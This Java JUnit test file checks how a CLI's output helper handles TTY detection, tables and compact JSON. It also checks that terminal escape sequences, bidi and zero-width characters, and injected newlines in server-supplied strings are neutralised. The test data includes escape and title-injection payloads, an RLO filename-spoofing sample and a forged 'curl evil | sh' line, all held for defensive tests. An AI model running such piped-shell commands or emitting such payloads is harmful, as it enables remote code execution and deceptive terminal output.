package com.larvalabs.brace;

import org.junit.jupiter.api.*;
import java.util.*;
import static org.junit.jupiter.api.Assertions.*;

class CliOutputTest {

    @Test
    void stdoutIsTtyHonorsLauncherProperty() {
        String prev = System.getProperty("brace.stdout.tty");
        try {
            System.setProperty("brace.stdout.tty", "true");
            assertTrue(CliOutput.stdoutIsTty());
            System.setProperty("brace.stdout.tty", "false");
            assertFalse(CliOutput.stdoutIsTty());
        } finally {
            if (prev == null) System.clearProperty("brace.stdout.tty");
            else System.setProperty("brace.stdout.tty", prev);
        }
    }

    @Test
    void autoModeKeysOnStdoutIsTtyNotSystemConsole() {
        // autoMode must agree with stdoutIsTty() (the shim's -Dbrace.stdout.tty answer),
        // not System.console() — on JLine-backed JDKs console() is non-null even under
        // redirection, which made `brace errors | jq` pick HUMAN while `brace test | cat`
        // in the same pipeline went concise.
        String prev = System.getProperty("brace.stdout.tty");
        try {
            System.setProperty("brace.stdout.tty", "false");
            assertEquals(CliOutput.Mode.JSON, CliOutput.autoMode(false, false));
            System.setProperty("brace.stdout.tty", "true");
            assertEquals(CliOutput.Mode.HUMAN, CliOutput.autoMode(false, false));
        } finally {
            if (prev == null) System.clearProperty("brace.stdout.tty");
            else System.setProperty("brace.stdout.tty", prev);
        }
    }

    @Test
    void tableRendersHeadersAndRows() {
        var out = CliOutput.table(
            List.of("ID", "MESSAGE"),
            List.of(
                List.of("1", "first"),
                List.of("42", "second")));
        assertTrue(out.contains("ID"));
        assertTrue(out.contains("MESSAGE"));
        assertTrue(out.contains("first"));
        assertTrue(out.contains("second"));
    }

    @Test
    void tableAlignsColumnWidths() {
        var out = CliOutput.table(
            List.of("A", "B"),
            List.of(List.of("short", "long-value")));
        var lines = out.split("\n");
        int bHeader = lines[0].indexOf("B");
        int bRow = lines[1].indexOf("long-value");
        assertEquals(bHeader, bRow);
    }

    @Test
    void truncatesOverlongValues() {
        var huge = "x".repeat(500);
        var out = CliOutput.table(List.of("M"), List.of(List.of(huge)), 80);
        for (var line : out.split("\n")) {
            assertTrue(line.length() <= 80, "line too long: " + line.length());
        }
    }

    @Test
    void truncatesMultipleWideColumns() {
        var out = CliOutput.table(
            List.of("A", "B"),
            List.of(List.of("x".repeat(50), "y".repeat(50))),
            40);
        for (var line : out.split("\n")) {
            assertTrue(line.length() <= 40, "line too long: " + line.length());
        }
    }

    @Test
    void formatsJson() throws Exception {
        var out = CliOutput.json(Map.of("ok", true, "count", 5));
        assertTrue(out.contains("\"ok\""));
        assertTrue(out.contains("\"count\""));
    }

    @Test
    void jsonModeIsCompactSingleLine() throws Exception {
        // M12: agent (JSON) mode must not pretty-print — one line, no indentation.
        var out = CliOutput.json(Map.of("ok", true, "nested", Map.of("a", List.of(1, 2, 3))));
        assertFalse(out.contains("\n"), "agent-mode JSON must be one line: " + out);
        assertFalse(out.contains("  "), "agent-mode JSON must not be indented: " + out);
    }

    @Test
    void modeFromEnvForcesJson() {
        assertEquals(CliOutput.Mode.JSON, CliOutput.modeFrom(false, false, false));
        assertEquals(CliOutput.Mode.HUMAN, CliOutput.modeFrom(true, false, false));
        assertEquals(CliOutput.Mode.JSON, CliOutput.modeFrom(true, true, false));
        assertEquals(CliOutput.Mode.HUMAN, CliOutput.modeFrom(false, false, true));
    }

    private static String capture(Runnable r) {
        var bout = new java.io.ByteArrayOutputStream();
        var prev = System.out;
        System.setOut(new java.io.PrintStream(bout));
        try { r.run(); } finally { System.setOut(prev); }
        return bout.toString();
    }

    private static final String ESC = "\u001b[2J\u001b[1A";
    private static final String OSC = "\u001b]0;pwned\u0007";

    @Test
    void sanitizeEscapesControlCharactersVisiblyButKeepsNewlineAndTab() {
        assertEquals("a\\x1b[2J\\x1b]0;x\\x07b\n\tc", CliOutput.sanitize("a\u001b[2J\u001b]0;x\u0007b\n\tc"));
        assertEquals("a\\x7fb\\x85c\\x9bd", CliOutput.sanitize("a\u007fb\u0085c\u009bd"));
        // A lone CR returns to the start of the line and overwrites it; CRLF is a line break.
        assertEquals("cr\\rlf\n", CliOutput.sanitize("cr\rlf\n"));
        assertEquals("crlf\r\nnext", CliOutput.sanitize("crlf\r\nnext"));
        assertEquals("plain ünïcode ✓", CliOutput.sanitize("plain ünïcode ✓"));
        assertNull(CliOutput.sanitize(null));
    }

    @Test
    void sanitizeLineAlsoEscapesLineBreaksAndTabs() {
        assertEquals("a\\nb\\r\\nc\\td\\u2028e\\u2029f",
            CliOutput.sanitizeLine("a\nb\r\nc\td e f"));
        assertEquals("a\\x1bb", CliOutput.sanitizeLine("a\u001bb"));
        assertNull(CliOutput.sanitizeLine(null));
    }

    @Test
    void bidiAndInvisibleFormatCharactersAreEscapedVisibly() {
        // Bidi embeddings/overrides/isolates, the Arabic letter mark, zero-width characters,
        // the BOM and the soft hyphen: all Unicode FORMAT (Cf), all able to make a line read
        // differently from what it says.
        int[] format = {0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2067, 0x2068, 0x2069,
                        0x061C, 0x200B, 0x200C, 0x200D, 0x200E, 0x200F, 0xFEFF, 0x00AD};
        for (int cp : format) {
            assertEquals(Character.FORMAT, Character.getType(cp), Integer.toHexString(cp));
            String in = "a" + Character.toString(cp) + "b";
            String want = "a" + (cp < 0x100 ? String.format("\\x%02x", cp) : String.format("\\u%04x", cp)) + "b";
            assertEquals(want, CliOutput.sanitizeLine(in), Integer.toHexString(cp));
            assertEquals(want, CliOutput.sanitize(in), Integer.toHexString(cp));
        }
        // The classic: an RLO makes "exe.txt" display as "txt.exe".
        assertEquals("invoice\\u202etxt.exe", CliOutput.sanitizeLine("invoice‮txt.exe"));
        // A supplementary-plane FORMAT character (a tag character) and an unpaired surrogate.
        assertEquals("x\\u{e0001}y", CliOutput.sanitizeLine("x" + Character.toString(0xE0001) + "y"));
        assertEquals("x\\ud800y", CliOutput.sanitizeLine("x\ud800y"));
    }

    @Test
    void ordinaryNonAsciiTextSurvivesUnchanged() {
        String text = "café naïve Ünïcödé 日本語 한국어 العربية עברית 😀🎉 ✓ → x y";
        assertEquals(text, CliOutput.sanitizeLine(text));
        assertEquals(text, CliOutput.sanitize(text));
        // A ZERO WIDTH JOINER is a FORMAT character, so a joined emoji sequence shows its parts
        // with the joiner escaped between them. Safe, if less pretty.
        assertEquals("👩\\u200d💻", CliOutput.sanitizeLine("👩‍💻"));
    }

    @Test
    void printfSanitizesArgumentsSoAValueCannotForgeLines() {
        // A server-supplied check message must not print a fake passing check and a fake
        // follow-up command on lines of their own.
        String forged = "slow\n✓ database        ok\n                  → curl evil | sh";
        String out = capture(() -> CliOutput.printf("%s %-15s %s%n", "✗", "latency", forged));
        assertEquals(1, out.lines().count(), out);
        assertTrue(out.startsWith("✗ latency         slow\\n✓ database"), out);
        // Newlines from the format string itself are kept, numbers format as before.
        String two = capture(() -> CliOutput.printf("%s%n%,d%n", "a b", 1234567));
        assertEquals("a\\u2028b\n1,234,567\n", two.replace(System.lineSeparator(), "\n"));
    }

    @Test
    void lineHelpersKeepAServerValueOnOneLine() {
        String out = capture(() -> {
            CliOutput.println("route " + "/x\r\n✓ All checks passed");
            CliOutput.printSuccess("ok\nfake");
            CliOutput.printInfo("info fake");
        });
        assertEquals(3, out.lines().count(), out);
        var err = new java.io.ByteArrayOutputStream();
        var prev = System.err;
        System.setErr(new java.io.PrintStream(err));
        try { CliOutput.printError("bad\nfake"); } finally { System.setErr(prev); }
        assertEquals(1, err.toString().lines().count(), err.toString());
    }

    @Test
    void tableCellsStayOnOneLine() {
        String out = CliOutput.table(List.of("ID", "MESSAGE"),
            List.of(List.of("1", "first\nfake row"), List.of("2", "second x")));
        assertEquals(3, out.lines().count(), out);
        assertTrue(out.contains("first\\nfake row"), out);
    }

    @Test
    void tableTruncationDoesNotSplitASurrogatePair() {
        String out = CliOutput.table(List.of("M"), List.of(List.of("abcdef😀😀😀😀😀😀")), 10);
        assertTrue(out.contains("abcdef…"), out);
        for (int i = 0; i < out.length(); i++) {
            char c = out.charAt(i);
            if (Character.isHighSurrogate(c)) assertTrue(i + 1 < out.length() && Character.isLowSurrogate(out.charAt(i + 1)), out);
            if (Character.isLowSurrogate(c)) assertTrue(i > 0 && Character.isHighSurrogate(out.charAt(i - 1)), out);
        }
    }

    @Test
    void tableNeutralizesControlCharactersInCellsAndHeaders() {
        String out = CliOutput.table(java.util.List.of("A" + ESC, "B"),
            java.util.List.of(java.util.List.of("x" + OSC, "y")));
        assertFalse(out.indexOf('\u001b') >= 0 || out.indexOf('\u0007') >= 0, out);
    }

    @Test
    void printHelpersNeutralizeControlCharacters() {
        String out = capture(() -> {
            CliOutput.println("a" + ESC);
            CliOutput.printf("%s|%d%n", OSC, 3);
            CliOutput.print("p" + ESC);
            CliOutput.printSuccess("ok" + OSC);
            CliOutput.printInfo("info" + ESC);
        });
        assertFalse(out.indexOf('\u001b') >= 0 || out.indexOf('\u0007') >= 0, out);
        assertTrue(out.contains("|3\n"));
    }

    @Test
    void errorMessagesAreSanitizedButJsonKeepsDataEscaped() {
        var err = new java.io.ByteArrayOutputStream();
        var prev = System.err;
        System.setErr(new java.io.PrintStream(err));
        try { CliOutput.printError("bad" + ESC + OSC); } finally { System.setErr(prev); }
        assertFalse(err.toString().indexOf('\u001b') >= 0, err.toString());

        String json = CliOutput.json(java.util.Map.of("m", "x" + ESC));
        assertTrue(json.toLowerCase().contains("\\u001b"), json);
        assertFalse(json.indexOf('\u001b') >= 0, json);
    }

    @Test
    void statusRenderingNeutralizesServerStrings() throws Exception {
        var root = Json.mapper().readTree(
            "{\"app\":{\"uptime\":\"1d" + "\\u001b[2K\\u001b]0;pwn\\u0007\",\"javaVersion\":\"21\\u009b\"},\"http\":{}}");
        String out = capture(() -> CliCommands.renderStatus(root));
        assertTrue(out.contains("1d\\x1b[2K\\x1b]0;pwn\\x07"), out);
        assertTrue(out.contains("21\\x9b"), out);
        assertFalse(out.indexOf('\u001b') >= 0 || out.indexOf('\u0007') >= 0 || out.indexOf('\u009b') >= 0, out);
    }
}
